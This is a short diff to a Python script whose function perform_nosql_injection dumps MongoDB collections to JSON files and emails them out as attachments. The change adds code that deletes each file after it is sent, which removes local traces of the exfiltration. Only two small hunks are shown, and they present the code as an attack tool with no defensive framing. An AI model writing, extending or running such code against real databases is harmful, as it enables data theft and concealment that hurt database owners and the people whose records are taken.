@@ -1,6 +1,7 @@
 import pymongo
 import json
 import smtplib
+import os
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -90,6 +91,10 @@ def perform_nosql_injection():
 
                 send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path)
                 print(f"Email sent with {filename}")
+
+                # Delete the JSON file
+                os.remove(filename)
+                print(f"{filename} deleted successfully.")
 
             else:
                 print(f"No data found in {db_name}.{collection_name}")
